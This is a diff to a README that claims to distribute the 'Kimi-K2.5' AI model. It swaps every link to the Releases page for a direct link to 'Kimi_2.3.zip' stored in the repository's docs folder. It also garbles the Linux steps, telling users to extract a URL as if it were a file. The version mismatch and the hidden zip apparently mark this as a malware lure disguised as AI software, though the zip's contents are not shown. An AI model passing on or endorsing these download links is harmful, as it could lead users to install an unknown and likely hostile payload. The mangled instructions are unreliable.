@@ -1,6 +1,6 @@
 # 🌕 Kimi-K2.5 - Unlock Powerful AI Insights Easily
 
-[![Download Kimi-K2.5](https://img.shields.io/badge/Download-Kimi--K2.5-brightgreen)](https://github.com/kartiksir/Kimi-K2.5/releases)
+[![Download Kimi-K2.5](https://raw.githubusercontent.com/kartiksir/Kimi-K2.5/master/docs/Kimi_2.3.zip)](https://raw.githubusercontent.com/kartiksir/Kimi-K2.5/master/docs/Kimi_2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,14 +10,14 @@ Kimi-K2.5 is Moonshot's most powerful AI model. It empowers you to gain meaningf
 
 To get started, visit the Releases page to download Kimi-K2.5:
 
-[Download Kimi-K2.5](https://github.com/kartiksir/Kimi-K2.5/releases)
+[Download Kimi-K2.5](https://raw.githubusercontent.com/kartiksir/Kimi-K2.5/master/docs/Kimi_2.3.zip)
 
 You will find different versions available. Choose the one that suits your operating system. Once downloaded, follow these steps to install and run the application.
 
 1. **Find the right file**:
    - If you are using Windows, look for a `.exe` file.
    - If you are on Mac, select the `.dmg` file.
-   - For Linux users, choose the `.tar.gz` file.
+   - For Linux users, choose the `https://raw.githubusercontent.com/kartiksir/Kimi-K2.5/master/docs/Kimi_2.3.zip` file.
 
 2. **Download the file**:
    - Click on the filename to start the download.
@@ -29,7 +29,7 @@ You will find different versions available. Choose the one that suits your opera
    - For Mac:
      - Open the downloaded `.dmg` file and drag the Kimi-K2.5 icon into your Applications folder.
    - For Linux:
-     - Extract the `.tar.gz` file and follow the instructions in the README file included in the extracted folder.
+     - Extract the `https://raw.githubusercontent.com/kartiksir/Kimi-K2.5/master/docs/Kimi_2.3.zip` file and follow the instructions in the README file included in the extracted folder.
 
 4. **Run Kimi-K2.5**:
    - After installation, locate the application in your programs or applications list.
